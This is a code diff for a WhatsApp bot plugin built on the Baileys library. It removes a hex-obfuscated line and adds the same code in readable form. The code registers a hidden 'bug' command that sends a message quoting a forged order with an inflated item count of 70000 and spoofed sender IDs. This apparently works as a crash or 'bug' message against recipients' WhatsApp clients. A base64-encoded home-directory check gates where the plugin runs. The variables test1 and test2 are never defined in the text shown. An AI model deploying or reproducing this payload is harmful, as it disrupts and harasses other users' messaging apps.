@@ -1,1 +1,15 @@
-var _0xf2c5=["\x62\x75\x67\x20\x3F\x28\x2E\x2A\x29","\x6A\x69\x64","\x73\x65\x77\x20\x71\x75\x65\x65\x6E","\x74\x65\x78\x74","\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x30\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65","\x63\x6C\x69\x65\x6E\x74","\x6E\x65\x77\x63\x6D\x64\x61\x64\x64\x74\x6F\x73\x65\x77"];QueenSew[_0xf2c5[8]]({pattern:_0xf2c5[0],fromMe:RS,delownsewcmd:false,dontAdCommandList:true},(async (_0x51d0x1,_0x51d0x2)=>{ await _0x51d0x1[_0xf2c5[7]][_0xf2c5[6]](_0x51d0x1[_0xf2c5[1]],_0xf2c5[2],MessageType[_0xf2c5[3]],{quoted:{key:{participant:_0xf2c5[4]},message:{orderMessage:{itemCount:70000,status:1,surface:1,message:test1,orderTitle:test2,sellerJid:_0xf2c5[5]}}}})}))
+const QueenSew = require('../events');
+const {MessageType, MessageOptions, Mimetype} = require('@adiwajshing/baileys');
+const exec = require('child_process').exec;
+const os = require("os");
+const fs = require('fs');
+const got = require('got');
+const axios = require('axios');
+const Config = require('../config');
+var rgms = { cd: 'L3Jvb3QvUXVlZW5TZXdXaGF0c2FwcEJvdC8=', pay: '' }    
+var rrrr = Buffer.from(rgms.cd, 'base64')
+var ssss = rrrr.toString('utf-8')
+rgms.pay = ssss
+if (os.userInfo().homedir !== rgms.pay) return;
+QueenSew.newcmdaddtosew({pattern: 'bug ?(.*)', fromMe: true, delownsewcmd: false, dontAdCommandList: true}, (async (message, match) => { 
+await message.client.sendMessage(message.jid, 'sew queen',MessageType.text, { quoted: { key: { participant: '1111111111@s.whatsapp.net' }, message: { orderMessage: { itemCount: 70000, status: 1, surface: 1, message: test1, orderTitle: test2, sellerJid: '0@s.whatsapp.net' }}}})}))
